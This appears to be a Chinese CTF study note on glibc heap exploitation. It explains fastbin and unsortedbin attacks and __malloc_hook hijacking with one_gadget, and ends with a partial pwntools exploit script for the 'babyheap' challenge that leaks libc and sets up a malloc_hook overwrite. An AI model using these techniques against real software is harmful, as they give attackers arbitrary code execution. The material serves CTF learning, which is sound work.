测试代码
    #include 
    #include 
    int main()
    {
        int *p1=malloc(0x100);
        int *p2=malloc(0x100);    
        puts("1");
        free(p1);
        free(p2);
        return 0;
    }
还是断到puts上面
free p1之后
## fastbin attack
### 原理
首先是因为free一个fastbin大小的chunk，会被放入fastbins链表中。如果此时通过malloc`*p=malloc(0x10)`申请一个区域，然后再把它free到fastbin中，但是不使得p的指针为NULL,就仍然会指向chunk的地址。
然后fastbin中的bin头的fd指针由于后进先出的原理还是指向我们刚刚的那个chunk，而p指针指向的就是这个chunk的fd。
此时这个chunk的fd指针指向的是0（滞空），那我们就可以通过修改p指针将fd指针指向我们所需要的 **目标地址** ，
    *p=target_addr
     fd=p;
然后去malloc一个跟我们释放的chunk相等大小的chunk，那么本来哪个被free掉的chunk就会从fastbin中被申请到实际堆内存中，然后fastbin的链表就被断掉了，这样就会使得arena的fastbin的bin头的fd指针指向于我们的target地址
    int *q=malloc(size)
此时bin头的fd指针已经指向target的地址了，如果我们再去malloc，就是把target这块地址malloc到堆内存了，这样就可以使用target地址，对它进行操作了
    int *target=malloc(size)
### target_addr 的构造
**检测：** 从fastbin中malloc一个freechunk的时候，会进行一些检测。
1：malloc的freechunk的大小需要在fastbin大小范围内（0x30-0x40时，却申请一个0x50的chunk，那么就不行）
2：检查chunk中的size的PREV_INUSE的数值，为1才能通过检测。
检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）。  
检测2：检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测。
**构造：**
1.需要让target目标地址指定到size成员地址处的数值，能曼珠检测1
2.当target地址处的数值不能曼珠fastbin要求时，可以通过内存地址的偏移，取target地址附近的其他地址。例如
此时我们就不是直接把target地址作为攻击的地址，因为它指定的偏移地址处的size成员不满足检测2.
3.我们选取攻击目标地址的偏移size成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，然后此时fastbin中的chunk大小为0x70~0x80，而伪造size成员处的数值为0x71时就不能符合要求，但是0x7f因为多了2个位就可以满足要求。
4.在二次malloc的时候，最好malloc一个大小在0x70~0x80之间的堆块（从之前的调试可以看出，其实此时的size要为0x60~0x70）这个我是申请了0x60和0x70，但此时chunk的大小为0x71和0x81。
申请了这样的chunk时，我们的目标地址就会被放入0x70~0x80范围的fastbin中，就可以通过0x7f来跳过检测1
#### 5.利用unsortedbin attack构造一个0x7f地址来构造target_addr
**核心思想**
一般情况下，只能在目标地址上写一个大数值，而且unsortedbin attack通常是为了配合fastbin
attack的构造target_addr使用的。
**原理**
unsortedbin正常存储freechunk的结构如图所示，此时这个freechunk是我们还可以通过指针操控的（虽然free了但没有置空）。
如果在取走堆块之前，将chunk1的bk指针修改成target地址
此时我们再去malloc申请chunk
就会有操作代码
    bck = freechunk->bk;
    unsorted_chunks(av)->bk = bck;
    bck-fd = unsorted_chunks(av);
操作过后就如图
此时target的fd内容就是unsortedbin头的fd指针（glibc中fd指针肯定是0x7f开头的大数值）。因此就实现target地址的指定位置处写入了一个大的数值。
**在fastbin attack中的运用：**
当fastbin
attack中构造堆块的时候，需要将目标地址的size数值处写入一个0x7f才能通过检测1的检查，如果没有办法写入0x7f的话，就需要用到unsortedbin
attack，将构造堆块的地址作为unsortedbin
attack的目标地址，通过改写unsortedbin头的fd指针为目标地址，就可以在指定位置写入0x7f的数值了（ **要计算好偏移位置** )
**操作：**
1.malloc fastchunk 0x70
2.free fastchunk
3.fastchunk.fd - > target_addr
4.malloc unsortedchunk 0x100
5.free unsortedchunk
6.改变 0x100+0x8的位置为target_addr （就是bk的位置)
7.malloc 0x100 此时已经把bin头的地址跟target.fd连接起来了
8.malloc 0x70 将第一次malloc的堆块取出来，此时fastbin中只有target了
9.malloc 0x70 取出target
(其中1 2 3 8 9是fastbin attack 4 5 6 7是unsortedbin attack)
    其中第8步来看一下。
    我们在第3步的时候，是通过指针来使得fastchunk.fd->target_addr的。
    但是实际上，target_addr是没有落在fastbin上面的。只能算是被连接到fastbin上面了
    所以在malloc 0x70的时候取出fastchunk，但是fastbin中仍然存在着target
    我们申请unsortedbinchunk并且修改bk指针为target_addr，的目的只是为了让bin头指向target.fd
**例子**
    #include 
    #include 
    #include 
    int main()
    {
        int size=0x100;
        char *p=malloc(size);
        printf("%p\n",p);
        free(p);
        puts("1"); //第一步
        *(long*)(p+8)=0x601100; //0x601100是我们的攻击目标
        puts("2"); //第二步
        char *r=malloc(size);
        printf("%p\n",r);
        puts("3"); //第三步
        return 0;
    }
由于申请了0x100的堆块，所以它被释放之后会被放入unsortedbin中
可以看到freechunk的bk和fd都指向于malloc_state结构体中的bin链头fd处。
然后在让bk指向target
最后一步的这个0x3，就是偏移了，因为我们只想取得0x7f，而0x601110的高位才是0x7f。
然后可以看到第三位才是7f，所以偏移是0x3.
### _malloc_hook攻击
**原理：** **malloc_hook攻击原理为fastbin attack，通过fastbin attack，我们可以发起**
malloc_hook攻击，将__malloc_hook作为我们的target。
malloc源代码
    void * __libc_malloc (size_t bytes){
        mstate ar_ptr;
        void *victim;
        //读取_malloc_hook钩子，如果有钩子，则运行钩子函数并返回
        void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);
        if (__builtin_expect (hook != NULL, 0))
            return (*hook)(bytes, RETURN_ADDRESS (0));
        arena_get (ar_ptr, bytes); //寻找一共合适的arena来加载内存
        victim = _int_malloc (ar_ptr, bytes);//尝试调用_int_malloc()来分配内存
        如果没有找到合适的内存，就尝试找一个可用的arena
        if (!victim && ar_ptr != NULL){
            LIBC_PROBE (memory_malloc_retry, 1, bytes);
            ar_ptr = arena_get_retry (ar_ptr, bytes);
            victim = _int_malloc (ar_ptr, bytes);
        }
        if (ar_ptr != NULL) //如果锁定了arena，还需要解锁该arena
            (void) mutex_unlock (&ar_ptr->mutex);
        return victim;
    }
方向①：我们可以将 **malloc_hook函数指针改为got表中的其它函数指针，那么当执行malloc的时候就回去直接执行我们修改的函数。  
方向②：如果我们将**malloc_hook函数指针修改为one_gadget的地址，那么我们就可以在执行malloc的时候起一个shell。
**方法：** 进程的_malloc_hook地址一定为0x7ffff7dd1b10，所以我们将0x7ffff7dd1b10作为我们的target目标。
但是由于0x7ffff7dd1b10地址的指定偏移处的size成员数值不能够满足glibc的检测，因此我们需要在malloc_hook地址附近找一块合适的地址作为我们的攻击目标。下图可以看出0x7ffff7dd1b10地址的数值都为0不符合要求。
通过尝试发现，0x7ffff7dd1b10-0x23地址处的指定8字节偏移处的数值能够满足glibc的检测，所以我们最终把0x7ffff7dd1b10-0x23=0x7ffff7dd1aed地址作为我们的攻击目标。从下图可以看出，0x7ffff7dd1b10-0x23地址的数值为0x7f，满足size成员的要求。
## babyheap-new
### 漏洞利用
程序主要在fill函数的地方存在堆溢出，且开启的PIE，需要泄露libc_base的地址。开启了Full
RELRO就说明不能使用修改got表劫持程序的控制流。
所以就考虑劫持malloc_hook函数并且修改malloc_hook为onegadget获取shell。
泄露libc_base使用的是堆块堆叠，将一共fast chunk和unsorted chunk重叠，然后释放unsorted
chunk，就可以通过打印fast chunk获取想要的地址。
先上脚本，然后跟着脚本(看的自己有修改)进行调试。
    from pwn import *
    p=process("./babyheap")
    #p=remote("node4.buuoj.cn",26283)
    def allocate(size):
        p.recvuntil('Command: ')
        p.sendline('1')
        p.recvuntil('Size: ')
        p.sendline(str(size))
    def fill(idx,content):
        p.recvuntil('Command: ')
        p.sendline('2')
        p.recvuntil('Index: ')
        p.sendline(str(idx))
        p.recvuntil('Size: ')
        p.sendline(str(len(content)))
        p.recvuntil('Content: ')
        p.send(content)
    def free(idx):
        p.recvuntil('Command: ')
        p.sendline('3')
        p.recvuntil('Index: ')
        p.sendline(str(idx))
    def dump(idx):
        p.recvuntil('Command: ')
        p.sendline('4')
        p.recvuntil('Index: ')
        p.sendline(str(idx))
        p.recvline()
        return p.recvline()
    allocate(0x10)      #chunk0
    allocate(0x10)      #chunk1
    allocate(0x10)      #chunk2
    allocate(0x10)      #chunk3
    allocate(0x80)      #chunk4
    free(1)
    free(2)
    #gdb.attach(p)
    payload = "a"*0x10
    payload += p64(0) + p64(0x21)
    payload += p64(0) + "a"*8
    payload += p64(0) + p64(0x21)
    payload += p8(0x80)     #chunk2->fd = chunk4
    fill(0,payload)
    #gdb.attach(p)
    payload = "A"*0x10
    payload += p64(0) + p64(0x21) #chunk4->size
    fill(3,payload)
    #gdb.attach(p)
    allocate(0x10)      #chunk1
    allocate(0x10)      #chunk2, 重叠chunk4
    //fill(1,'aaaa')
    //fill(2,'bbbb')
    payload = "A"*0x10
    payload += p64(0) + p64(0x91)  #chunk4->size
    fill(3,payload)
    allocate(0x80)      #chunk5
    free(4)
    leak_addr = u64(dump(2)[:8])
    libc_base = leak_addr - 0x3c4b78
    malloc_hook = libc_base + libc.symbols['_malloc_hook']
    allocate(0x60)      #chunk4
    free(4)
    #payload = p64(malloc_hook - 0x20+0xd)